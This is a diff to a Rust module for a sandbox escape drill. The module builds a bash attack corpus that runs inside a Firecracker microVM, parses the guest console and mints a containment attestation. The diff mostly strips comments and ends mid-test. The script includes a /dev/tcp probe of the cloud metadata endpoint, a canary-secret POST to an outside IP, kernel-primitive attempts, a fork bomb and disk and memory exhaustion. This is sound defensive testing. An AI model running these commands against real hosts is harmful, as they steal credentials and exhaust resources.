@@ -1,129 +1,27 @@
-//! # The escape-drill adversarial corpus + the green-attestation artifact (CI-P5 → P-239, M2)
-//!
-//! **Owning architecture (byte-authoritative):**
-//! `planning/04-subsystem-architectures/continuous-integration/architecture/02-internals-and-algorithms.md`
-//! §5.5 ("The escape drill (D-4 / T-5) — CI's single hard go/no-go") — the adversarial corpus
-//! enumerated + the green-attestation artifact. **Drills:**
-//! `planning/05-refined-shared-systems-architecture/testing-strategy/01-whole-system-e2e-and-drill-catalogue.md`
-//! row **AG-D4 / CI-T1** (compute tool attempts a kernel escape on a REAL kernel → **ZERO escapes**;
-//! green escape attestation or CI is no-go) + §3.5 (the one hard gate — the adversarial corpus
-//! families) + §2.5 (the survival-signal assertions). **Reconciliation:**
-//! `00-reconciliation-decisions.md` X-6 (the escape drill gates ALL agent execution, not only CI).
-//! **Contract:** `contract-index.md` row 8.4 (the real-kernel escape drill gates both kinds).
-//!
-//! ## What this module IS — the corpus AS DATA + the attestation format (no boot here)
-//! This module carries the corpus **definition** (the seven adversarial families enumerated as
-//! [`AttackFamily`] + the per-attack [`AttackMarker`] catalogue), the **in-guest script generation**
-//! ([`build_corpus_script`] — the bash payload run as PID1 inside the hardened microVM), the
-//! **host-side marker parser** ([`parse_console`] → [`DrillReport`]), and the **green-attestation
-//! artifact format** ([`EscapeAttestation`] — the dated, structured record AG-P17 (P-229) consumes).
-//!
-//! It is **VM-free and DB-free**: this module never boots a guest. The REAL drill — boot a
-//! Firecracker microVM, run the corpus, observe containment, emit the attestation — lives ONLY in
-//! the `integration`-feature test (`tests/escape_drill_test.rs`), gated to SKIP gracefully without
-//! `/dev/kvm` / `firecracker`. So `cargo build --workspace` + the default `cargo test` stay green
-//! without a kernel, while the HARD GATE runs the full corpus on real silicon.
-//!
-//! ## The PROVE-IT discipline (EI-04 §5.1; EI-01 §3)
-//! A property not drilled on a REAL kernel is a claim, not a fact. The corpus FORCES each attack and
-//! the system is OBSERVED to contain it: each attack prints `CONTAINED` **only if it genuinely failed
-//! to escape**, `ESCAPED` if it breached. The host-side drill counts escapes; **ANY escape — or any
-//! attack that did NOT run (a missing marker) — makes the gate RED**. There is NO hardcoded
-//! "0 escapes": [`DrillReport::is_green`] is computed from the parsed console, and the attestation is
-//! emitted ONLY when the real run is green. A red AG-D4 is a dated no-go (a scorecard row), NEVER a
-//! weakened threshold.
-//!
-//! ## The mandatory hardening profile is ENFORCED on the kernel-primitive family
-//! The kernel-exploit primitives (load a module / `/dev/mem` / I/O ports / privileged mount) are run
-//! under the mandatory hardening posture (arch 02 §5.3): **all Linux caps dropped + no-new-privs**
-//! (via `setpriv` in-guest), so a privileged op is DENIED (EPERM) exactly as it is for a hardened
-//! sandbox payload — and the KVM boundary contains the rest. The fork bomb is contained by a
-//! **cgroup v2 `pids.max`** ceiling (the [`HardeningProfile::pids_max`](crate::hardening::HardeningProfile)
-//! value), and the ceiling is asserted to have HELD (the kernel refused excess forks; the guest
-//! stayed up). Egress attacks (metadata SSRF / control-plane / cross-tenant / secret exfil) fail
-//! because the fully default-deny profile attaches **no NIC at all** (egress closed at the device
-//! level). Disk fill hits ENOSPC on the quota'd tmpfs scratch; root stays read-only.
-//!
-//! ## MUTATION-SCORE FLOOR (mandatory-core, security-load-bearing)
-//! The corpus + attestation modules are **mandatory-core and the single most security-load-bearing
-//! code in the build** (they decide the AG-D4 / CI-T1 go/no-go for ALL untrusted execution). Their
-//! cargo-mutants mutation-score floor is **100% — zero surviving mutants** (the same floor the
-//! runner's exactly-once idempotency carries). The load-bearing predicates each have a mutant-killing
-//! unit test: [`DrillReport::is_green`] (a flipped `==`/`&&`/`||` or a dropped clause is killed by
-//! `a_single_escape_makes_the_gate_red`, `a_missing_marker_makes_the_gate_red_not_green`,
-//! `a_truncated_console_without_the_end_marker_is_red`); [`parse_console`]'s exact-token match (a
-//! relaxed `==`→`contains` is killed by `substring_ids_do_not_false_match` + the DidNotRun default);
-//! and [`EscapeAttestation::from_green_drill`]'s refuse-over-red guard (a deleted/negated check is
-//! killed by `attestation_is_refused_over_a_red_drill`). The corpus↔catalogue lockstep
-//! (`the_corpus_catalogue_and_the_generated_script_stay_in_lockstep`) kills a mutant that drops an
-//! attack from the generated script.
-//!
-//! ## FLOOR (named per CI-P5) — there is NO floor on ZERO-escapes
-//! ZERO escapes is BOTH the floor and the full answer, and a **PERMANENT GATE** re-run on every
-//! backend/image/kernel change (untrusted-code execution is a never-"done" surface, EI-04 §5). The
-//! gVisor second backend re-runs THIS SAME drill (**CI-P28**); the M4-boundary re-confirm is
-//! **CI-P27 / P-348**; continuous fuzzing + the full CVE corpus + a pre-GA third-party pentest remain
-//! ongoing residuals. This drill PROVES the hard gate on **Firecracker (the production default)**;
-//! gVisor (`runsc`) is a NAMED parametrized residual (run-when-available — see [`Backend`]).
-
 use serde::{Deserialize, Serialize};
 
-/// The corpus version stamped into every attestation (arch 02 §5.5: the corpus version is part of
-/// the green artifact, so a re-run after a corpus change is a NEW attestation). Bump on any change
-/// to the attack set / [`build_corpus_script`].
-///
-/// v2 (CT-003b / SI-017): added the anonymous-memory-hog family ([`MEMHOG_ID`]) so the memory
-/// enforcer (Firecracker guest-RAM cap / the gVisor out-of-band cgroup) is GATED, not vacuous.
 pub const CORPUS_VERSION: u32 = 2;
 
-/// The marker id of the anonymous-memory-hog attack (CT-003b). Its containment is proven
-/// STRUCTURALLY (see [`parse_console`]): a contained hog OOM-kills the prober (on gVisor the WHOLE
-/// sentry) before it can print a `CONTAINED` line, so the corpus prints an `ATTEMPT` sentinel BEFORE
-/// the oversized allocation and an `ESCAPED` line ONLY if the allocation HELD.
 pub const MEMHOG_ID: &str = "Mx_memhog";
 
-/// How much ANONYMOUS memory the [`MEMHOG_ID`] probe tries to hold — chosen WELL OVER every job
-/// spec's `mem_bytes` (all current specs cap at 256 MiB), so the allocation must be prevented/killed
-/// by the memory bound. A host with a larger `mem_bytes` ceiling would need this sized up (residual).
 pub const MEMHOG_BYTES: u64 = 1024 * 1024 * 1024;
 
-/// The marker grep prefix the host-side parser keys on. Each attack prints `<id> CONTAINED` or
-/// `<id> ESCAPED`; the corpus brackets its output with [`BEGIN_MARKER`] / [`END_MARKER`] so a
-/// truncated console (the guest died mid-corpus) is detectable (a missing END ⇒ not all attacks ran
-/// ⇒ RED).
 pub const BEGIN_MARKER: &str = "CORPUS_BEGIN";
-/// The end-of-corpus marker (see [`BEGIN_MARKER`]).
 pub const END_MARKER: &str = "CORPUS_END";
 
-/// The seven adversarial families enumerated by arch 02 §5.5 / drill-catalogue §3.5. Each family
-/// owns one or more concrete [`AttackMarker`]s; the attestation reports a per-family CONTAINED count.
 #[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
 pub enum AttackFamily {
-    /// Kernel-exploit primitives: load a module, raw I/O-port (ioperm/iopl), write `/dev/mem`,
-    /// privileged mount — each must be DENIED (EPERM) under the hardened profile; the KVM boundary
-    /// contains the rest.
     KernelExploit,
-    /// Cloud-metadata SSRF → cred theft (`169.254.169.254`) — must fail (no route / no NIC).
     CloudMetadataSsrf,
-    /// Control-plane / internal-RPC reach (a private/control-plane address) — must fail (no route).
     ControlPlaneReach,
-    /// Cross-tenant network/storage (another tenant's host) — must fail (no route).
     CrossTenant,
-    /// Secret exfil via egress — must be blocked by egress default-deny.
     SecretExfil,
-    /// Fork bomb past the pids ceiling — must be contained (cgroup `pids.max` held; guest stayed up).
     ForkBomb,
-    /// Disk fill past the scratch quota — must hit ENOSPC; root stays read-only.
     DiskFill,
-    /// Anonymous-memory hog past the memory ceiling (CT-003b / SI-017) — must be OOM-killed within
-    /// the limit, never consuming host RAM beyond it. Firecracker bounds it with the guest-RAM hard
-    /// cap; gVisor bounds it with an out-of-band host cgroup (rootless `runsc` does NOT enforce the
-    /// OCI `memory.limit`, so the cgroup is the real enforcer). Containment is proven STRUCTURALLY.
     MemHog,
 }
 
 impl AttackFamily {
-    /// The stable string key used in the attestation's per-family count map.
     pub fn key(self) -> &'static str {
         match self {
             AttackFamily::KernelExploit => "kernel_exploit",
@@ -137,7 +35,6 @@ impl AttackFamily {
         }
     }
 
-    /// All eight families, in corpus order.
     pub fn all() -> &'static [AttackFamily] {
         &[
             AttackFamily::KernelExploit,
@@ -152,21 +49,12 @@ impl AttackFamily {
     }
 }
 
-/// One concrete attack in the corpus: its console marker id + the family it belongs to. The id is
-/// what the in-guest script prints (`<id> CONTAINED|ESCAPED`) and what [`parse_console`] looks for.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub struct AttackMarker {
-    /// The marker id the in-guest script prints (e.g. `K1_module`).
     pub id: &'static str,
-    /// The family this attack belongs to.
     pub family: AttackFamily,
 }
 
-/// The full enumerated catalogue of concrete attacks (one row per marker the corpus prints). The
-/// host-side drill REQUIRES every one of these to have printed a `CONTAINED` (and zero `ESCAPED`) —
-/// a marker absent from the console means "the attack did not run" ⇒ RED. This catalogue and
-/// [`build_corpus_script`] MUST stay in lockstep (a unit test asserts every catalogued id appears in
-/// the generated script).
 pub const CORPUS: &[AttackMarker] = &[
     AttackMarker {
         id: "K1_module",
@@ -218,30 +106,15 @@ pub const CORPUS: &[AttackMarker] = &[
     },
 ];
 
-/// Build the in-guest bash corpus script (run as PID1 in the hardened microVM via
-/// `init=/bin/bash /dev/vdb`). `pids_max` is the cgroup `pids.max` fork-bomb ceiling
-/// (the [`HardeningProfile::pids_max`](crate::hardening::HardeningProfile) value).
-///
-/// The script is staged on a virtio drive (`/dev/vdb`) by the drill harness, then **padded to a
-/// block boundary** (a Firecracker drive smaller than 512 bytes presents as 0 blocks — the host
-/// harness handles the padding). Each attack prints `<id> CONTAINED` iff it genuinely failed to
-/// breach the boundary, `<id> ESCAPED` if it breached. The kernel-primitive family runs UNDER the
-/// mandatory hardening posture (all-caps-dropped + no-new-privs via `setpriv`); the fork bomb is
-/// capped by a cgroup-v2 `pids.max` and the ceiling is asserted to have HELD.
 pub fn build_corpus_script(pids_max: u32) -> String {
-    // `pids_max` is a u32 formatted as a decimal literal — no shell-injection surface.
     format!(
         r#"# AG-D4 / CI-T1 adversarial escape corpus (corpus_version={cv})
-# PID1 bash, hardened Firecracker microVM, REAL KVM kernel. Markers parsed by the host drill:
-#   "<id> CONTAINED" iff the attack genuinely failed to breach the boundary; "<id> ESCAPED" if it did.
 mount -t proc proc /proc 2>/dev/null
 mount -t sysfs sys /sys 2>/dev/null
 mount -t tmpfs -o size=8m tmpfs /run 2>/dev/null
 mount -t cgroup2 cg2 /sys/fs/cgroup 2>/dev/null
 echo "{begin} corpus_version={cv} kernel=$(uname -r 2>/dev/null) guest_euid=$EUID"
 
-# ---- family: kernel-exploit primitives, run UNDER the mandatory hardening profile
-#      (all-caps-dropped + no-new-privs); each privileged op must be DENIED/EPERM ----
 cat > /run/k.sh <<'ATK_EOF'
 if modprobe dummy 2>/dev/null || insmod /x.ko 2>/dev/null; then echo "K1_module ESCAPED"; else echo "K1_module CONTAINED"; fi
 if dd if=/dev/zero of=/dev/mem bs=1 count=1 seek=1048576 2>/dev/null; then echo "K2_devmem ESCAPED"; else echo "K2_devmem CONTAINED"; fi
@@ -250,20 +123,15 @@ if mount -t tmpfs none /proc/sys 2>/dev/null; then echo "K4_mount ESCAPED"; else
 ATK_EOF
 setpriv --no-new-privs --bounding-set -all --inh-caps -all --ambient-caps -all /bin/bash /run/k.sh 2>/dev/null
 
-# ---- cloud-metadata SSRF (169.254.169.254) — no NIC => no route ----
 if timeout 3 bash -c 'exec 3<>/dev/tcp/169.254.169.254/80; printf "GET /latest/meta-data/ HTTP/1.0\r\n\r\n">&3' 2>/dev/null; then echo "M1_metadata_ssrf ESCAPED"; else echo "M1_metadata_ssrf CONTAINED"; fi
 
-# ---- control-plane / internal-RPC reach — no route ----
 if timeout 3 bash -c 'exec 3<>/dev/tcp/10.0.0.1/8080' 2>/dev/null; then echo "C1_controlplane ESCAPED"; else echo "C1_controlplane CONTAINED"; fi
 
-# ---- cross-tenant network — no route ----
 if timeout 3 bash -c 'exec 3<>/dev/tcp/192.168.13.37/443' 2>/dev/null; then echo "T1_crosstenant ESCAPED"; else echo "T1_crosstenant CONTAINED"; fi
 
-# ---- secret exfil via egress (default-deny must block) ----
 SECRET="myelin-drill-canary-$$"
 if timeout 3 bash -c "exec 3<>/dev/tcp/93.184.216.34/80; printf 'POST %s' '$SECRET'>&3" 2>/dev/null; then echo "E1_secret_exfil ESCAPED"; else echo "E1_secret_exfil CONTAINED"; fi
 
-# ---- fork bomb — cgroup pids.max ceiling must HOLD; guest stays up ----
 mkdir -p /sys/fs/cgroup/drill 2>/dev/null
 echo "+pids" > /sys/fs/cgroup/cgroup.subtree_control 2>/dev/null
 echo {pids_max} > /sys/fs/cgroup/drill/pids.max 2>/dev/null
@@ -276,19 +144,11 @@ REFUSED=$(awk '/^max/{{print $2}}' /sys/fs/cgroup/drill/pids.events 2>/dev/null)
 kill $BOMB 2>/dev/null
 if [ "${{PEAK:-9999}}" -le "${{PMAX:-0}}" ] && [ "${{REFUSED:-0}}" -gt 0 ]; then echo "F1_forkbomb CONTAINED peak=$PEAK ceiling=$PMAX refused=$REFUSED"; else echo "F1_forkbomb ESCAPED peak=$PEAK ceiling=$PMAX"; fi
 
-# ---- disk fill + read-only root ----
 if echo x 2>/dev/null > /root_write_probe; then echo "D1_root_readonly ESCAPED"; rm -f /root_write_probe 2>/dev/null; else echo "D1_root_readonly CONTAINED"; fi
 mount -t tmpfs -o size=4m tmpfs /run/scratch 2>/dev/null || mkdir -p /run/scratch
 dd if=/dev/zero of=/run/scratch/fill bs=1M count=64 2>/dev/null; rc=$?
 if [ $rc -ne 0 ]; then echo "D2_diskfill CONTAINED enospc_rc=$rc"; else echo "D2_diskfill ESCAPED"; fi
 
-# ---- anonymous-memory hog (Mx_memhog) — the microVM HARD-CAPS guest RAM, so an oversized anon
-#      allocation is OOM-killed in-guest (the hog subshell dies; PID1 survives). Containment is
-#      STRUCTURAL: the ATTEMPT sentinel + the END marker are printed BEFORE the alloc, and the
-#      ESCAPED line prints ONLY if the oversized alloc HELD (the memory bound failed). The trailing
-#      CONTAINED line is printed by the surviving parent (FC) for an authoritative marker; on a
-#      backend where the whole guest is killed (gVisor) the host-side parser infers CONTAINED from
-#      ATTEMPT-present-and-ESCAPED-absent. A regression dropping the memory bound => ESCAPED => RED. ---
 echo "{memhog_id} ATTEMPT bytes={hog}"
 echo "{end}"
 ( S=aaaaaaaaaaaaaaaa; n=0; while [ $n -lt 26 ]; do S="$S$S"; n=$((n+1)); done; echo "{memhog_id} ESCAPED held=${{#S}}" ) 2>/dev/null
@@ -305,32 +165,20 @@ reboot -f
     )
 }
 
-/// The outcome of one catalogued attack as observed on the guest console.
 #[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
 pub enum AttackOutcome {
-    /// The attack genuinely failed to breach the boundary (the GOOD outcome).
     Contained,
-    /// The attack breached the boundary (CATASTROPHIC — any one ⇒ the gate is RED).
     Escaped,
-    /// No marker for this attack appeared on the console — the attack did NOT run (e.g. the guest
-    /// died mid-corpus). Treated as a RED condition (a property not drilled is not proven).
     DidNotRun,
 }
 
-/// The host-side parse of a real guest console into per-attack outcomes (the OBSERVATION half of the
-/// drill). Built ONLY from the captured console — never hardcoded.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct DrillReport {
-    /// Per catalogued attack, in [`CORPUS`] order: `(marker_id, family, outcome)`.
     pub outcomes: Vec<(&'static str, AttackFamily, AttackOutcome)>,
-    /// Whether the corpus printed its END marker (every attack ran to completion). A truncated
-    /// console (guest died mid-corpus) has `corpus_completed == false` ⇒ RED.
     pub corpus_completed: bool,
 }
 
 impl DrillReport {
-    /// The total number of escapes observed across the corpus. The GATE passes iff this is 0 AND
-    /// every attack ran (no [`AttackOutcome::DidNotRun`]) AND the corpus completed.
     pub fn escapes(&self) -> usize {
         self.outcomes
             .iter()
@@ -338,8 +186,6 @@ impl DrillReport {
             .count()
     }
 
-    /// The number of attacks that did not run (a missing marker). Any > 0 ⇒ RED (a property not
-    /// drilled is not proven).
     pub fn did_not_run(&self) -> usize {
         self.outcomes
             .iter()
@@ -347,8 +193,6 @@ impl DrillReport {
             .count()
     }
 
-    /// The per-family CONTAINED count (for the attestation). Only [`AttackOutcome::Contained`]
-    /// outcomes are counted.
     pub fn contained_by_family(&self, family: AttackFamily) -> u32 {
         self.outcomes
             .iter()
@@ -356,15 +200,10 @@ impl DrillReport {
             .count() as u32
     }
 
-    /// **The GATE predicate.** Green iff the corpus completed, every catalogued attack ran, and
-    /// ZERO escapes were observed. This is computed from the parsed console — there is no hardcoded
-    /// "0 escapes". A red result is a dated no-go, never a weakened threshold.
     pub fn is_green(&self) -> bool {
         self.corpus_completed && self.escapes() == 0 && self.did_not_run() == 0
     }
 
-    /// A human-readable per-attack summary line (for the test's `--nocapture` proof + the no-go
-    /// scorecard row on a red).
     pub fn summary(&self) -> String {
         let mut s = format!(
             "AG-D4 drill: {} attacks | escapes={} did_not_run={} corpus_completed={}\n",
@@ -380,20 +219,11 @@ impl DrillReport {
     }
 }
 
-/// Parse a captured guest serial console into a [`DrillReport`] (the OBSERVATION half of the drill).
-/// For each catalogued attack, the parser looks for `"<id> CONTAINED"` or `"<id> ESCAPED"` on a
-/// line; if neither appears, the attack [`DidNotRun`](AttackOutcome::DidNotRun). The corpus-completed
-/// flag is set iff the [`END_MARKER`] appears (every attack ran to completion).
-///
-/// The parser is deliberately strict: an `ESCAPED` marker for ANY attack (or a missing marker)
-/// drives the gate RED. It never infers `CONTAINED` from the absence of `ESCAPED`.
 pub fn parse_console(console: &str) -> DrillReport {
     let corpus_completed = console.contains(END_MARKER);
     let outcomes = CORPUS
         .iter()
         .map(|atk| {
-            // Look for an explicit marker line for this attack id. Match `<id> CONTAINED` /
-            // `<id> ESCAPED` as whitespace-delimited tokens so a substring id can't false-match.
             let mut outcome = AttackOutcome::DidNotRun;
             for line in console.lines() {
                 let mut toks = line.split_whitespace();
@@ -410,14 +240,6 @@ pub fn parse_console(console: &str) -> DrillReport {
                         outcome = AttackOutcome::Escaped;
                         break;
                     }
-                    // STRUCTURAL containment for the anon-memory hog (CT-003b), and ONLY for it: a
-                    // contained hog is OOM-killed (on gVisor the WHOLE sentry) BEFORE it can print a
-                    // `CONTAINED` line, so the corpus prints `<id> ATTEMPT` just before the oversized
-                    // alloc and `<id> ESCAPED` ONLY if the alloc HELD. For THIS id, an ATTEMPT with no
-                    // later ESCAPED ⇒ Contained (proven structurally). We do NOT `break` so a real
-                    // ESCAPED line (the alloc held ⇒ the bound failed) still overrides to Escaped.
-                    // This does NOT relax the strict rule for any other attack: their absence of an
-                    // explicit ESCAPED stays DidNotRun (a property not drilled is never inferred green).
                     Some("ATTEMPT") if atk.id == MEMHOG_ID => {
                         outcome = AttackOutcome::Contained;
                     }
@@ -433,20 +255,13 @@ pub fn parse_console(console: &str) -> DrillReport {
     }
 }
 
-/// Which isolation backend was exercised by a drill run. Firecracker is the production default and
-/// the GATE; gVisor (`runsc`) is the named parametrized residual (run-when-available, CI-P28).
 #[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
 pub enum Backend {
-    /// The Firecracker microVM (KVM + minimal VMM) — the production default; the AG-D4 GATE is
-    /// PROVEN on this backend.
     FirecrackerMicrovm,
-    /// gVisor (`runsc`) — the named second backend (CI-P28); a parametrized residual on hosts that
-    /// lack the privileges `runsc` needs.
     GvisorRunsc,
 }
 
 impl Backend {
-    /// The stable string key used in the attestation.
     pub fn key(self) -> &'static str {
         match self {
             Backend::FirecrackerMicrovm => "firecracker(microVM/KVM)",
@@ -455,68 +270,38 @@ impl Backend {
     }
 }
 
-/// Whether a parametrized backend was actually exercised in this drill, or recorded as a
-/// run-when-available residual (e.g. gVisor on a host without the privileges `runsc` needs — do NOT
-/// fake it). Carried in the attestation so a consumer (AG-P17 / P-229) sees exactly which backends
-/// were genuinely drilled vs deferred.
 #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
 pub struct BackendRun {
-    /// The backend.
     pub backend: Backend,
-    /// True iff the corpus was ACTUALLY run on this backend on real silicon in this drill.
     pub exercised: bool,
-    /// When not exercised, the reason (e.g. "runsc requires privileges this host lacks (no sudo)").
     pub residual_note: Option<String>,
 }
 
-/// The **green-attestation artifact** (arch 02 §5.5) — the dated, structured record a green AG-D4 /
-/// CI-T1 drill emits, and **exactly what AG-P17 (P-229) consumes** as the gate that must be green on
-/// the production backend before any untrusted execution in M3+. It is emitted ONLY when the real
-/// run is green ([`DrillReport::is_green`]); a red drill emits NO attestation (it is a dated no-go).
-///
-/// Fields: backend(s) exercised, the rootfs + kernel image sha256 digests, the kernel version, the
-/// corpus version, the per-family CONTAINED counts, `total_escapes` (MUST be 0), and a timestamp.
 #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
 pub struct EscapeAttestation {
-    /// The artifact kind tag (so a consumer can dispatch on it).
     pub artifact: String,
-    /// The drill id (`AG-D4 / CI-T1`).
     pub drill: String,
-    /// ISO-8601 date the drill ran (the run date stamps this; a real CI run stamps the wall clock).
     pub date: String,
-    /// The backends drilled in this run — which were ACTUALLY exercised vs named residual.
     pub backends: Vec<BackendRun>,
-    /// The production-default backend on which the GATE is proven (Firecracker).
     pub gate_backend: Backend,
-    /// The sha256 of the guest rootfs image (the "image digest" — re-run on every image change).
     pub rootfs_sha256: String,
-    /// The sha256 of the guest kernel image (re-run on every kernel change).
     pub kernel_sha256: String,
-    /// The guest kernel version (`uname -r`, e.g. `6.1.168`).
     pub kernel_version: String,
-    /// The corpus version (re-run on every corpus change).
     pub corpus_version: u32,
-    /// Per-family CONTAINED counts (family key → count). Every catalogued attack is CONTAINED.
     pub contained_by_family: Vec<(String, u32)>,
-    /// The total escapes observed — **MUST be 0** for a green attestation (the gate predicate).
     pub total_escapes: u32,
-    /// The total attacks run (every catalogued attack ran — no DidNotRun).
     pub total_attacks: u32,
-    /// The named residuals (the permanent-gate / gVisor-CI-P28 / M4-re-confirm-CI-P27 / fuzzing+CVE+
-    /// pentest notes), carried in the artifact so the consumer sees the no-floor posture in writing.
     pub residuals: Vec<String>,
 }
 
 impl EscapeAttestation {
-    /// The named residuals for the AG-D4 / CI-T1 gate (CI-P5), stated in writing (arch 02 §5.5;
-    /// drill-catalogue §3.5 + §4 PERMANENT GATE; AG-P17 floor):
     pub fn residuals() -> Vec<String> {
         vec![
-            "ZERO-escapes is BOTH the floor and the full answer — there is NO mutation-score / \
+            "ZERO-escapes is BOTH the floor and the full answer - there is NO mutation-score / \
              threshold floor below it; it is a PERMANENT GATE re-run on every backend/image/kernel \
              change forever (untrusted-code execution is a never-\"done\" surface, EI-04 §5)."
                 .to_string(),
-            "gVisor (runsc) re-runs THIS SAME drill as the named second backend — CI-P28."
+            "gVisor (runsc) re-runs THIS SAME drill as the named second backend - CI-P28."
                 .to_string(),
             "The M4-boundary re-confirm on the prod CI image is CI-P27 / P-348 (agent-side AG-P21)."
                 .to_string(),
@@ -526,10 +311,6 @@ impl EscapeAttestation {
         ]
     }
 
-    /// Build a green attestation from a real, green drill report. Returns `Err` if the report is NOT
-    /// green — an attestation is NEVER minted over a red drill (a red AG-D4 is a dated no-go, never a
-    /// weakened threshold). This is the structural guard that a green attestation can only describe a
-    /// genuinely-green run.
     #[allow(clippy::too_many_arguments)]
     pub fn from_green_drill(
         date: impl Into<String>,
@@ -571,8 +352,6 @@ impl EscapeAttestation {
         })
     }
 
-    /// The one-line `[AG-D4 GREEN] …` stdout line (the telemetry green artifact line — EI-01 §3:
-    /// observability is part of the pass).
     pub fn green_line(&self) -> String {
         let exercised: Vec<&str> = self
             .backends
@@ -596,7 +375,6 @@ impl EscapeAttestation {
         )
     }
 
-    /// Serialize to the JSON artifact form AG-P17 (P-229) consumes.
     pub fn to_json(&self) -> String {
         serde_json::to_string_pretty(self).expect("EscapeAttestation is always serializable")
     }
@@ -606,7 +384,6 @@ impl EscapeAttestation {
 mod tests {
     use super::*;
 
-    /// A console where every catalogued attack reports CONTAINED and the corpus completed.
     fn green_console() -> String {
         let mut s = format!("{BEGIN_MARKER} corpus_version=1 kernel=6.1.168 guest_euid=0\n");
         for atk in CORPUS {
@@ -618,8 +395,6 @@ mod tests {
 
     #[test]
     fn the_corpus_catalogue_and_the_generated_script_stay_in_lockstep() {
-        // Every catalogued attack id MUST appear in the generated in-guest script (so a real run
-        // actually attempts it). A drift here would let an attack silently not run.
         let script = build_corpus_script(64);
         for atk in CORPUS {
             assert!(
@@ -628,17 +403,12 @@ mod tests {
                 atk.id
             );
         }
-        // The script brackets its output with the begin/end markers + sets pids.max from the arg.
         assert!(script.contains(BEGIN_MARKER));
         assert!(script.contains(END_MARKER));
         assert!(script.contains("/sys/fs/cgroup/drill/pids.max"));
         assert!(script.contains("> /sys/fs/cgroup/drill/pids.max"));
         assert!(script.contains("echo 64 >") || script.contains("echo 64>"));
-        // The hardening posture is enforced on the kernel-primitive family.
         assert!(script.contains("setpriv --no-new-privs"));
-        // CT-003b: the anon-memory hog prints its ATTEMPT sentinel BEFORE the END marker (so the
-        // corpus completes even when the contained hog kills the prober mid-alloc) and the oversized
-        // allocation step comes AFTER it.
         let attempt = script
             .find(&format!("{MEMHOG_ID} ATTEMPT"))
             .expect("memhog ATTEMPT sentinel");
@@ -647,9 +417,6 @@ mod tests {
             attempt < end,
             "the memhog ATTEMPT sentinel must precede the END marker"
         );
-        // The hog is a pure-shell doubling allocator that HOLDS the anon memory in the shell process
-        // itself (16·2^26 ≈ 1 GiB) — no command-substitution child whose death could falsely report
-        // an empty "held=0" escape. It exceeds every current spec's mem_bytes (256 MiB).
         assert!(script.contains(r#"S="$S$S""#) && script.contains("while [ $n -lt 26 ]"));
         assert_eq!(
             MEMHOG_BYTES,
@@ -676,7 +443,6 @@ mod tests {
         assert_eq!(report.did_not_run(), 0);
         assert!(report.corpus_completed);
         assert!(report.is_green());
-        // Per-family CONTAINED counts add up to the catalogue size.
         let total: u32 = AttackFamily::all()
             .iter()
             .map(|f| report.contained_by_family(*f))
@@ -686,7 +452,6 @@ mod tests {
 
     #[test]
     fn a_single_escape_makes_the_gate_red() {
-        // Flip ONE attack to ESCAPED — the whole gate goes red (one escape is catastrophic).
         let mut console = green_console();
         console = console.replace("K2_devmem CONTAINED", "K2_devmem ESCAPED");
         let report = parse_console(&console);
@@ -696,8 +461,6 @@ mod tests {
 
     #[test]
     fn a_missing_marker_makes_the_gate_red_not_green() {
-        // Remove one attack's line entirely (the attack did NOT run). The parser must NOT infer
-        // CONTAINED from the absence of ESCAPED — it reports DidNotRun ⇒ RED.
         let console = green_console().replace("M1_metadata_ssrf CONTAINED extra=stuff\n", "");
         let report = parse_console(&console);
         assert_eq!(report.did_not_run(), 1);
@@ -710,7 +473,6 @@ mod tests {
 
     #[test]
     fn a_truncated_console_without_the_end_marker_is_red() {
-        // The guest died mid-corpus (no END marker) — even if every printed line is CONTAINED.
         let mut console = green_console();
         console = console.replace(&format!("{END_MARKER}\n"), "");
         let report = parse_console(&console);
@@ -723,8 +485,6 @@ mod tests {
 
     #[test]
     fn family_keys_are_distinct_and_stable() {
-        // The per-family attestation count map keys on these; they must be non-empty + distinct
-        // (a mutant returning "" or a duplicate would collapse the count map).
         let keys: Vec<&str> = AttackFamily::all().iter().map(|f| f.key()).collect();
         assert!(
             keys.iter().all(|k| !k.is_empty()),
@@ -740,8 +500,6 @@ mod tests {
 
     #[test]
     fn summary_names_every_attack_and_the_verdict_counts() {
-        // The summary is the no-go scorecard row on a red + the --nocapture proof; it must name every
-        // catalogued attack id and carry the escape/did_not_run counts (a mutant returning "" fails).
         let report = parse_console(&green_console());
         let s = report.summary();
         assert!(s.contains("escapes=0"));
@@ -754,15 +512,10 @@ mod tests {
 
     #[test]
     fn substring_ids_do_not_false_match() {
-        // `D1_root_readonly` must not be matched by a line that merely contains it as a substring of
-        // a longer token, nor must `D2` match `D1`. The parser splits on whitespace and compares the
-        // FIRST token exactly.
         let mut console = green_console();
-        // Inject a noise line that contains an id as a substring of a longer first token.
         console.push_str("XK2_devmem CONTAINED\n");
-        console.push_str("note: K2_devmem was attempted\n"); // first token `note:` ≠ id
+        console.push_str("note: K2_devmem was attempted\n");
         let report = parse_console(&console);
-        // K2 still resolves from its real `K2_devmem CONTAINED` line (green console), unaffected.
         let (_, _, k2) = report
             .outcomes
             .iter()
@@ -773,11 +526,6 @@ mod tests {
 
     #[test]
     fn memhog_attempt_without_escaped_is_contained_structurally() {
-        // CT-003b: on gVisor a contained hog OOM-kills the WHOLE sentry mid-alloc, so the corpus can
-        // print only the `ATTEMPT` sentinel (+ the END marker, emitted BEFORE the alloc), never a
-        // `CONTAINED` line. The parser must STRUCTURALLY read {ATTEMPT present, ESCAPED absent} as
-        // Contained — for this id ONLY. We build a console with every OTHER attack CONTAINED and the
-        // memhog reported only as ATTEMPT.
         let mut s = format!("{BEGIN_MARKER} corpus_version={CORPUS_VERSION} guest_euid=65534\n");
         for atk in CORPUS {
             if atk.id == MEMHOG_ID {
@@ -787,7 +535,6 @@ mod tests {
         }
         s.push_str(&format!("{MEMHOG_ID} ATTEMPT bytes=1073741824\n"));
         s.push_str(&format!("{END_MARKER}\n"));
-        // (the sentry was killed during the alloc — no `Mx_memhog CONTAINED`/`ESCAPED` line follows)
         let report = parse_console(&s);
         assert_eq!(*outcome_for(&report, MEMHOG_ID), AttackOutcome::Contained);
         assert_eq!(report.escapes(), 0);
@@ -801,9 +548,6 @@ mod tests {
 
     #[test]
     fn memhog_escaped_after_attempt_is_escaped() {
